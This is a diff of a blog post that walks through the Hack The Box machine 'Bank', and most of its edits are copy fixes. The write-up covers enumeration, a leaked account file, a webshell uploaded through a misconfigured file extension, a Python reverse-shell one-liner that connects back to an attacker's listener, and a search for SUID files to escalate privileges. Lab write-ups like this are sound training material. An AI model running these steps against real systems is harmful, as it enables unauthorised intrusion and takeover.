@@ -6,7 +6,7 @@ tags: [bank, hackthebox, htb, walkthrough, pentest, CTF]
 comments: true
 ---
 
-This is a penetration test for a machine from hackthebox.eu called bank. It was made in about 5 hours through my  coworker’s company [last](http://blog.notso.pro "last"). This machine has not been  difficult to hack but at the beginning, we did not know how to proceed so through trial and error and we successfully hacked the machine.
+This is a penetration test for a machine from hackthebox.eu called bank. It was made in about 5 hours with my coworker’s company [last](http://blog.notso.pro "last"). This machine has been somewhat difficult to hack, however through trial and error, we successfully hacked the machine.
 The only information we received was the name of the machine.
 
 ````
@@ -17,7 +17,7 @@ and the ip address
 10.10.10.29 
 ```
 
-so we scanned it using nmap
+We scanned it using nmap
 
 ~~~
 root@kali:~# nmap -sV -p- -n 10.10.10.29
@@ -35,25 +35,23 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 51.26 seconds
 ~~~
 
-we can notice we found 3 services to check.
+We found 3 services to check.
 
 - OpenSSH 6.6.1p1
 - ISC BIND 9.9.5-3ubuntu0.14
 - Apache httpd 2.4.7
 
-but there weren't known vulnerabilities for them.
+There were no known vulnerabilities for them.
 
-So We tried to connect on the 80 port for checking the web server, but we didn't get interesting things.
-The response was the default page of Apache, and there weren't hidden surprises in the source code.
-We continued the PT enumerating the hidden directories using **dirbuster** but nothing happened.
+We tried to connect on the 80 port for checking the web server, but we did not find anything significant.
+The response was the default page of Apache, and there were no hidden surprises in the source code.
+We continued the PT, enumerating the hidden directories using **dirbuster** but we did not find anything of relevance.
 
 
-We wasted many time trying to find the right way, 
-using some big wordlist for the directories webserver enumeration, connecting to the 53 port, scanning UDP port of the machine but we didn't get any result.
-After few hours spent wasting time, we had an idea.
-Maybe the server was configured with virtualhost, so using the right domain we would be able to connect to the web application.
+We used big wordlists for the directories webserver enumeration, connected to the 53 port, and scanned the UDP ports of the machine without any results.
+We came to the conclusion that maybe the server was configured with virtualhosts, and using the right domain name would allow us to connect to the web application.
 
-so we edited our hosts file
+We edited our hosts file
 ~~~
 root@kali:/# nano etc/hosts
 ~~~
@@ -63,9 +61,9 @@ adding this line
 10.10.10.29	bank.htb
 ~~~
 
-so going by browser on `bank.htb` TADA'!!!
-we found the login panel of the web application.
-SQL injection didn't work, so we tried again to enumerate the directories.
+Going by browser on `bank.htb` and TADA'!!!
+We found the login panel of the web application.
+SQL injection did not work, so we tried again to enumerate the directories.
 
 ## ENUMERATION
 I launched my dear friends **dirsearch**
@@ -73,12 +71,12 @@ I launched my dear friends **dirsearch**
 ~~~
 root@kali:~/dirsearch# python3 dirsearch.py -u bank.htb -e * -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
 ~~~
-let me analyze the command:
+Let me analyze the command:
 - **-u bank.htb** for specifying the Host
 - **-e \*** for the extentions (we set ALL) 
 - **-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt** for the wordlist, i preferred to use the biggest wordlist for being sure
 
-That's the result
+This was the result.
 
 ~~~
 [15:06:44] Starting: 
@@ -92,19 +90,19 @@ That's the result
 Task Completed
 ~~~
 
-Our attenction was on
+Our attention was focused on:
 
 ~~~
 [15:18:06] 301 -  314B  - /balance-transfer  ->  http://bank.htb/balance-transfer/
 ~~~
 
-in this directory there was an huge list of crypted .acc (account) files.
+In this directory, there was a long list of crypted .acc (account) files.
 
-They were so similar, so **last** said me to check the size, We found one smaller then the others.
+They were so similar, so **last** asked me to check the size. We found one smaller than the others.
 
 ![found-not-encrypted](https://mrsaighnal.github.io/img/posts/2019-04-26-bank-walkthrough/found-not-encrypted.png "found-not-encrypted")
 
-One file wasn't crypted and the informations were readable.
+One file was not crypted and the data was readable.
 
 ~~~
 --ERR ENCRYPT FAILED
@@ -122,24 +120,24 @@ Balance: 8842803 .
 ===UserAccount===
 ~~~
 
-We were able to log in the platform, watching the balance, transaction history etc etc.
-The vulnerability was inside the support page, there was an upload module, but we didn't find a way for uploading malware right there.
+We were able to log into the platform, watching the balance, and the transaction history, etc.
+The vulnerability was inside the support page.  There was an upload module, but we did not find a way for uploading malware there.
 
 
 ![found-not-encrypted](https://mrsaighnal.github.io/img/posts/2019-04-26-bank-walkthrough/support-page.png "support-page")
 
 ### EXPLOITATION
 
-Reading more deeply we discovered the developer missed an important information used for debugging inside the HTML source code.
+Reading more deeply, we discovered the developer missed an important piece of information inside the HTML source code.
 
 ~~~
 <!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
 ~~~
 
 
-**thanks Mr Dev!** We can now upload our fantastic square-webshell (you should look at it on the [official repository](https://github.com/MrSaighnal/square-webshell "official repo")) simply changing the extension to .htb .
+**Thanks Mr Dev!** We can now upload our fantastic square-webshell (you should look at it on the [official repository](https://github.com/MrSaighnal/square-webshell "official repo")) simply changing the extension to .htb .
 
-exploring the file system we found the first flag
+Exploring the file system we found the first flag
 
 ~~~
 cat ../../../../home/chris/user.txt
@@ -155,16 +153,16 @@ user.txt output:
 {: .box-success}
 **Success:** User Owned.
 
-it's now time to spawn real shell for managing our new system :-)
+It's now time to spawn real shell for managing our new system :-)
 
-let's get ready our computer for receving connections through **nc** using the command
+Let's prepare our computer for receiving connection from our reverse shell through **nc**, using the command:
 
 ~~~
 root@kali:~# nc -vv -n -l -p 1337
 ~~~
 Our machine is now listening on the 1337 port. (Don't close this terminal!!!)
 
-let's launch on the webshell this command
+Let's launch this command on the webshell
 
 ~~~
 python -c 'import socket,subprocess,os;
@@ -176,9 +174,9 @@ os.dup2(s.fileno(),2);
 p=subprocess.call(["/bin/sh","-i"]);'
 ~~~
 
-be sure to edit the 3°raw with your parameters **YOUR_IP** and **PORT**.
+Be sure to edit the 3° row with your parameters **YOUR_IP** and **YOUR_PORT**.
 
-come back on your **nc** terminal and you shold see something similar to:
+Come back on your **nc** terminal and you shold see something similar to:
 
 ~~~
 root@kali:~# nc -vv -n -l -p 1337
@@ -188,7 +186,7 @@ connect to [10.10.14.2] from (UNKNOWN) [10.10.10.29] 51390
 $
 ~~~
 
-let's try to launch a command
+Let's try to launch a command
 
 ~~~
 root@kali:~# nc -vv -n -l -p 1337
@@ -199,23 +197,23 @@ $ whoami
 www-data
 $ 
 ~~~
-it works.
+It works.
 
 ### PRIVILEDGE ESCALATION
 
-for priviledge escalation we launched a command for checking all files with high priviledge 
+For priviledge escalation we launched a command for checking all files with high priviledge 
 
 ~~~
 $ find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2> /dev/null
 ~~~
 
-and the first apperd so weird:
+and the first one we found appeared really interesting:
 
 ~~~
 -rwsr-xr-x 1 root root 112204 Jun 14  2017 `/var/htb/bin/emergency`
 ~~~
 
-Our friend sysadmin misconfigurated the system leaving an important vulnerability open, through this file anybody is able to become root.
+Our friend sysadmin misconfigurated the system, leaving an important vulnerability open.  Through this file, anyone is able to become root.
 
 ~~~
 cd /var/htb/bin/
